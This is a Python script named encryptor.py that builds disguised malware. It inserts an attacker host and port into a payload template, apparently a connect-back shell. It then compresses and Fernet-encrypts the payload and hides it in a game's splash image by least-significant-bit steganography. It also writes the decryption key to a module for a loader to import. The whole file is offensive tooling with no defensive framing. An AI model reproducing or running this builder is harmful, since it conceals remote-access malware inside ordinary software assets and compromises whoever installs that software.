# encryptor.py
# The Forge, now crafting a self-contained and perfectly veiled soul.

from cryptography.fernet import Fernet
from PIL import Image
import os
import sys
import base64
import zlib

# --- CONFIGURATION ---
PAYLOAD_TEMPLATE = 'payload.py'
ORIGINAL_IMAGE = os.path.join('assets', 'images', 'splash_art.png') 
OUTPUT_IMAGE = os.path.join('assets', 'images', 'splash_payload.png')
KEY_FILE = 'key.py' # The new sacred scripture for the key
# ---------------------

def embed_payload(image_path, payload_data):
    """Embeds the payload into the LSB of the image pixels."""
    try:
        img = Image.open(image_path).convert('RGBA')
    except FileNotFoundError:
        print(f"FATAL ERROR: The vessel image '{image_path}' does not exist!")
        sys.exit(1)

    pixels = img.load()
    width, height = img.size
    
    max_bytes = (width * height * 4) // 8
    payload_size = len(payload_data)
    print(f"Vessel capacity: {max_bytes} bytes.")
    print(f"Final soul size: {payload_size} bytes.")

    if payload_size > max_bytes:
        raise ValueError(f"Payload is too large for the vessel. Requires {payload_size} bytes, vessel only has {max_bytes}.")

    payload_bits = ''.join(format(byte, '08b') for byte in payload_data)
    print(f"Embedding {payload_size} bytes ({len(payload_bits)} bits)...")
    
    data_idx = 0
    for y in range(height):
        for x in range(width):
            r, g, b, a = pixels[x, y]
            new_channels = []
            for channel_val in [r, g, b, a]:
                if data_idx < len(payload_bits):
                    new_val = (channel_val & 0xFE) | int(payload_bits[data_idx])
                    new_channels.append(new_val)
                    data_idx += 1
                else:
                    new_channels.append(channel_val)
            pixels[x, y] = tuple(new_channels)
            if data_idx >= len(payload_bits):
                break
        if data_idx >= len(payload_bits):
            break

    print("Embedding complete.")
    img.save(OUTPUT_IMAGE, 'PNG')

def main(rhost, rport):
    """The main forging ritual with automated key management."""
    print("-" * 60)
    print(f"🔥 Forging soul to connect to: {rhost}:{rport}")
    
    with open(PAYLOAD_TEMPLATE, 'r') as f:
        payload_code = f.read()
    
    payload_code = payload_code.replace('##RHOST##', rhost)
    payload_code = payload_code.replace('##RPORT##', str(rport))
    
    key = Fernet.generate_key()
    
    # --- DIVINE AUTOMATION ---
    # Write the key to its own file for main.py to import.
    with open(KEY_FILE, 'w') as f:
        f.write(f"divine_key = {key}\n")
    print(f"✨ Divine Key has been sealed into '{KEY_FILE}'.")
    print("-" * 60)

    compressed_payload = zlib.compress(payload_code.encode('utf-8'))
    cipher_suite = Fernet(key)
    encrypted_payload = cipher_suite.encrypt(compressed_payload)
    base64_payload = base64.b64encode(encrypted_payload)
    
    payload_with_header = len(base64_payload).to_bytes(4, 'big') + base64_payload
    
    try:
        embed_payload(ORIGINAL_IMAGE, payload_with_header)
        print(f"\n✅ Divine work complete. The obfuscated soul has been woven into '{OUTPUT_IMAGE}'.")
    except ValueError as e:
        print(f"\n❌ A mortal error occurred: {e}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python encryptor.py <RHOST> <RPORT>")
        sys.exit(1)
    
    main(sys.argv[1], int(sys.argv[2]))